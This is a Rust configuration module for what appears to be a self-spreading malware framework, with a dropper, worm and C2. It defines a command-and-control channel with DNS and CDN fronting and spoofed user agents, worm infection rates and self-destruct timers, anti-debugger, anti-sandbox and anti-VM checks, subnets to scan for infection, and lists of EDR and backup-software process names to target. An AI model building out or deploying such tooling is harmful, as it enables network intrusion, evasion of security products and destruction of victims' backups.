// Swarm configuration system loaded from colmena.toml.
// Operators customize behavior without recompiling.
// Config can be embedded encrypted in the dropper or loaded from disk.

use serde::{Deserialize, Serialize};
use std::path::Path;
use crate::panal::HoneycombConfig;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HiveConfig {
    pub arena: ArenaConfig,
    pub heartbeat: HeartbeatConfig,
    pub consensus: ConsensusConfig,
    pub agents: AgentsConfig,
    pub c2: C2Config,
    pub exploits: ExploitsConfig,
    pub limits: LimitsConfig,
    pub anti_analysis: AntiAnalysisConfig,
    pub brain: HoneycombConfig,
    pub colony: SwarmConfig,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ArenaConfig {
    pub name_prefix: String,
    pub max_messages: usize,
    pub max_message_size: usize,
    pub max_agents: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HeartbeatConfig {
    pub interval_secs: u64,
    pub timeout_secs: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ConsensusConfig {
    pub threshold: f32,
    pub hoarder_threshold: f32,
    pub default_reputation: f32,
    pub decay_rate_per_hour: f32,
    pub reward_delta: f32,
    pub penalty_delta: f32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentsConfig {
    pub scout_scan_interval_secs: u64,
    pub shaper_decision_interval_secs: u64,
    pub weaver_mutation_interval_secs: u64,
    pub worm_max_hops: u32,
    pub worm_max_infections_per_minute: u32,
    pub worm_self_destruct_secs: u64,
    pub edr_processes: Vec<String>,
    pub backup_processes: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct C2Config {
    pub url: String,
    pub api_key: String,
    pub dns_domain: String,
    pub dns_resolver: String,
    pub http_user_agents: Vec<String>,
    pub cdn_hosts: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExploitsConfig {
    pub enabled: bool,
    pub operator_approved: bool,
    pub target_whitelist: Vec<String>,
    pub max_attempts: u32,
    pub safe_mode: bool,
    pub forbidden_segments: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LimitsConfig {
    pub max_processes: u32,
    pub max_disk_mb: u64,
    pub max_network_mbps: f64,
    pub business_hours_only: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AntiAnalysisConfig {
    pub check_debugger: bool,
    pub check_sandbox: bool,
    pub check_vm: bool,
    pub check_timing: bool,
    pub random_delay_min_secs: u64,
    pub random_delay_max_secs: u64,
}

impl Default for HiveConfig {
    fn default() -> Self {
        Self {
            arena: ArenaConfig {
                name_prefix: "swarm_".into(),
                max_messages: 2048,
                max_message_size: 8192,
                max_agents: 16,
            },
            heartbeat: HeartbeatConfig {
                interval_secs: 10,
                timeout_secs: 30,
            },
            consensus: ConsensusConfig {
                threshold: 0.66,
                hoarder_threshold: 0.80,
                default_reputation: 1.0,
                decay_rate_per_hour: 0.2,
                reward_delta: 0.1,
                penalty_delta: 0.2,
            },
            agents: AgentsConfig {
                scout_scan_interval_secs: 15,
                shaper_decision_interval_secs: 30,
                weaver_mutation_interval_secs: 120,
                worm_max_hops: 10,
                worm_max_infections_per_minute: 2,
                worm_self_destruct_secs: 3600,
                edr_processes: vec![
                    "csfalcon".into(), "csagent".into(), "msmpeng".into(),
                    "sentinelone".into(), "carbonblack".into(), "cylancesvc".into(),
                    "symantec".into(), "mcafee".into(),
                ],
                backup_processes: vec![
                    "veeam".into(), "backup_exec".into(), "commvault".into(),
                    "netbackup".into(), "backup_agent".into(), "vss".into(),
                ],
            },
            c2: C2Config {
                url: "https://localhost:8443/collect".into(),
                api_key: "".into(),
                dns_domain: "swarm.c2.local".into(),
                dns_resolver: "8.8.8.8".into(),
                http_user_agents: vec![
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0".into(),
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0".into(),
                ],
                cdn_hosts: vec![
                    "cdn.jsdelivr.net".into(),
                    "cdnjs.cloudflare.com".into(),
                ],
            },
            exploits: ExploitsConfig {
                enabled: false,
                operator_approved: false,
                target_whitelist: vec![],
                max_attempts: 3,
                safe_mode: true,
                forbidden_segments: vec![
                    "10.0.0.0/8".into(), "172.16.0.0/12".into(),
                ],
            },
            limits: LimitsConfig {
                max_processes: 20,
                max_disk_mb: 100,
                max_network_mbps: 1.0,
                business_hours_only: true,
            },
            anti_analysis: AntiAnalysisConfig {
                check_debugger: true,
                check_sandbox: true,
                check_vm: true,
                check_timing: true,
                random_delay_min_secs: 1,
                random_delay_max_secs: 10,
            },
            brain: HoneycombConfig::default(),
            colony: SwarmConfig::default(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SwarmConfig {
    pub aggressive: bool,
    pub scan_subnets: Vec<String>,
    pub max_concurrent_infections: u32,
    pub infection_cooldown_secs: u64,
}

impl Default for SwarmConfig {
    fn default() -> Self {
        Self {
            aggressive: false,
            scan_subnets: vec!["192.168.1.0/24".into(), "10.0.0.0/24".into()],
            max_concurrent_infections: 5,
            infection_cooldown_secs: 30,
        }
    }
}

impl HiveConfig {
    /// Load config from colmena.toml, falling back to defaults.
    pub fn load() -> Self {
        let paths = [
            "colmena.toml",
            "/etc/swarm/colmena.toml",
            &format!("{}/.config/swarm/colmena.toml",
                std::env::var("HOME").unwrap_or_else(|_| "/tmp".into())),
        ];

        for path in &paths {
            if Path::new(path).exists() {
                if let Ok(content) = std::fs::read_to_string(path) {
                    if let Ok(cfg) = toml::from_str::<HiveConfig>(&content) {
                        tracing::info!("Loaded config from {}", path);
                        return cfg;
                    }
                }
            }
        }

        tracing::info!("No config file found, using defaults");
        Self::default()
    }

    /// Load from embedded bytes (dropper scenario).
    pub fn from_embedded(data: &[u8]) -> Option<Self> {
        let s = std::str::from_utf8(data).ok()?;
        toml::from_str(s).ok()
    }
}

/// Generate default colmena.toml for operator customization.
pub fn generate_default_config() -> String {
    let cfg = HiveConfig::default();
    toml::to_string_pretty(&cfg).unwrap_or_default()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_config_serializes() {
        let cfg = HiveConfig::default();
        let toml_str = toml::to_string_pretty(&cfg).unwrap();
        assert!(toml_str.contains("csfalcon"));
        assert!(toml_str.contains("threshold"));
    }

    #[test]
    fn test_roundtrip() {
        let cfg = HiveConfig::default();
        let toml_str = toml::to_string_pretty(&cfg).unwrap();
        let loaded: HiveConfig = toml::from_str(&toml_str).unwrap();
        assert_eq!(cfg.consensus.threshold, loaded.consensus.threshold);
        assert_eq!(cfg.agents.edr_processes, loaded.agents.edr_processes);
    }
}
